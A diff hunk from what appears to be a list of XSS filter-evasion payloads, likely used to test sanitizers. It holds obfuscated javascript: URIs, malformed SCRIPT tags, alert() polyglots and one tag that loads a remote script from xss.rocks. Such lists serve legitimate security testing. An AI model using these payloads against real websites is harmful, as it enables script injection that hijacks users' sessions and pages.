@@ -28,8 +28,7 @@ alert\\`1\\`
 <IMG SRC="jav&amp;#x0A;ascript:alert('XSS');">
 <IMG SRC=java%00script:alert(\"XSS\")>
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT\s" != "<SCRIPT/XSS\s
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT\s" != "<SCRIPT/XSS\s';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <SCRIPT/SRC="http:&#47;&#47;xss.rocks/xss.js"></SCRIPT>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
